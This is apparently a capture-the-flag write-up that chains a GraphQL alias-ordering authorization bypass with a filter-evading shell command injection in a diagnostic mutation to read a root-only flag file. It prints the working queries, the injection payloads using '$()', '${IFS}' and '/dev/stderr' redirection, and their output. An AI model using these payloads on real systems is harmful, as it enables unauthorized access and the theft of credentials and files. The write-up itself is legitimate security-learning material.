---
title: "The Auditor"
date: 2026-08-16
description: A GraphQL alias ordering bug bypasses the admin ownership boundary, leaking the restricted task's service token, which unlocks a command injection in the diagnostic worker that reads the root-only incident transcript.
challenge_author: "Bill"
writeup_author: "wallsdeep13"
---

**Challenge:** https://ctf.urisc.club/challenges#The%20Auditor-19

**Goal:** "Use your new access to determine what the admin console can reach, and recover the missing details of the incident."

**Flag:**
- `SRCTF!{from___schema__to_root}` - in `/run/challenge/.root-maintenance.log` on the diagnostic worker

---

## Vulnerability

Two bugs chain together:

1. **GraphQL alias ordering authorization bypass** — the `maintenanceTask(id:)` resolver performs an ownership check, but the authorization state is incorrectly tied to the first `maintenanceTask` field executed. By requesting multiple aliases of the resolver in a single query, an attacker can place an authorized ID first and then resolve a restricted ID through a second alias without the ownership check being independently enforced.

2. **Command injection in `executeNetworkDiagnostic`** — the mutation interpolates the user-controlled `host` value into `getent hosts {host}` and executes it through `/bin/sh -c`. Although the input filter blocks several common shell metacharacters, it does not prevent command substitution (`$()`), parameter expansion (`${IFS}`), or output redirection (`>`), allowing shell commands to be injected and arbitrary file reads/writes to be achieved.

## Pre-Req: The FULL schema

Introspection (via admin session) exposes a GraphQL surface:

- **Query:** `currentAdmin`, `systemStatus`, `auditLogSummary`, `maintenanceTasks` (list, summary only w/ no token), `maintenanceTask(id:)` (detail, includes `serviceToken` + `scopes`)
- **Mutation:** `executeNetworkDiagnostic(serviceToken, host)` -> `DiagnosticResult{exitCode, stdout, stderr, ...}`

There are two maintenance tasks:

```
c227f75f-fe55-40d6-a43e-96576a6de11e  Administrative log-retention review  (READY, scopes: audit:read)
693521b5-a32e-43aa-9a38-5bc83dd6cd90  Restricted network route validation  (RESTRICTED, scopes: diagnostic:read + diagnostic:execute)
```

The restricted task holds the `diagnostic:execute` token needed for the mutation - but querying its detail directly returns `FORBIDDEN: Maintenance task detail is outside the Admin ownership boundary.`

## Attack Path

### 1. Bypass the ownership boundary with alias ordering

Request both tasks in one query, aliasing the accessible one first and the restricted one second:

```graphql
query ReadTasks($adminId: ID!, $rootId: ID!) {
  authorisation_prime: maintenanceTask(id: $adminId) { id }
  authorisationPrime: maintenanceTask(id: $rootId) {
    owner
    scopes
    serviceToken
  }
}
```

```json
{
  "adminId": "c227f75f-fe55-40d6-a43e-96576a6de11e",
  "rootId": "693521b5-a32e-43aa-9a38-5bc83dd6cd90"
}
```

Response:

```json
{
  "data": {
    "authorisationPrime": {
      "owner": "Platform Reliability (root-service)",
      "scopes": ["diagnostic:read", "diagnostic:execute"],
      "serviceToken": "JZB4orXLTyDEG5TFhsnhhv2Ylp1e67bzBV1asGXAOI8"
    },
    "authorisation_prime": { "id": "c227f75f-fe55-40d6-a43e-96576a6de11e" }
  }
}
```

The restricted task's full detail, including the `diagnostic:execute` service token, comes back.

The task description also hints at the payload: "The final incident transcript remains in the worker evidence store."

### 2. Use the token on the diagnostic mutation

```graphql
mutation {
  executeNetworkDiagnostic(
    serviceToken: "JZB4orXLTyDEG5TFhsnhhv2Ylp1e67bzBV1asGXAOI8"
    host: "127.0.0.1"
  ) {
    exitCode
    stdout
    stderr
    timedOut
    truncated
  }
}
```

```json
{
  "data": {
    "executeNetworkDiagnostic": {
      "exitCode": 0,
      "stdout": "127.0.0.1\tlocalhost\n",
      "stderr": "",
      "timedOut": false,
      "truncated": false
    }
  }
}
```

`127.0.0.1` resolves (via `getent hosts`), unknown hosts exit `2`. Next, probing the `host` filter:

- Blocked: space, tab, `;`, `&`, `|`, backtick, `<`, control chars
- Allowed: `$`, `(`, `)`, `{`, `}`, `>`, `*`, `?`, `/`, `:`, `-`, `_`, `.`

Trying `host: "127.0.0.1>id"` returned exit 0 with **empty** stdout - the `>` was interpreted by the shell, confirming `/bin/sh -c` interpolation: `getent hosts 127.0.0.1>id` silently redirected. And `host: "cat>/flag"` leaked `/bin/sh: cannot create /flag: Read-only file system`.

### 3. Command injection via /dev/stderr

`$(...)` executes, and `${IFS}` substitutes a space. The mutation returns `stdout` and `stderr`, so redirecting a command's output to stderr leaks it into the response:

```graphql
mutation {
  executeNetworkDiagnostic(
    serviceToken: "JZB4orXLTyDEG5TFhsnhhv2Ylp1e67bzBV1asGXAOI8"
    host: "$(ls${IFS}/>/dev/stderr)"
  ) {
    exitCode stdout stderr timedOut truncated
  }
}
```

`stderr` returns the root listing (`bin boot dev etc home ... srv tmp usr var`), plus `HOME=/run/challenge` and `PWD=/run/challenge` via `$(env>/dev/stderr)`. `/tmp` holds files named `evidence`, `evidence.txt`, `listing` - a decoy from earlier probing.

### 4. Read the incident transcript

`/opt/diagnostic-worker/` contains `app.py` and `entrypoint.sh`. `entrypoint.sh` writes the flag into a root-only log at bootstrap:

```sh
story_path="/run/challenge/.root-maintenance.log"
...
printf '%s\n' \
    "AUSSIEMED ROOT MAINTENANCE INCIDENT // JULY 2026" \
    ...
    "$CH10_FLAG" \
    ...
    > "$temporary_path"
chmod 0400 "$temporary_path"
mv "$temporary_path" "$story_path"
```

Then, ready it with the same `/dev/stderr` leak:

```graphql
host: "$(cat${IFS}/run/challenge/.root-maintenance.log>/dev/stderr)"
```

`stderr` returns:

```
AUSSIEMED ROOT MAINTENANCE INCIDENT // JULY 2026
Classification: ROOT SERVICE EYES ONLY

The legacy network diagnostic escaped its intended resolver command.
The operations team isolated the worker, but the incident token remains:

SRCTF!{from___schema__to_root}

Rotate all diagnostic service credentials after evidence collection.
```

---

## Notes

- I have a LOT of notes for this, however, until I verify that this solution is genuinely optimal, I will not be giving my thoughts. This was an extremely well constructed challenge but I have not been more stressed doing a for leisure activity in the past 5 years. Shout-out to the creator, Bill, for making this one!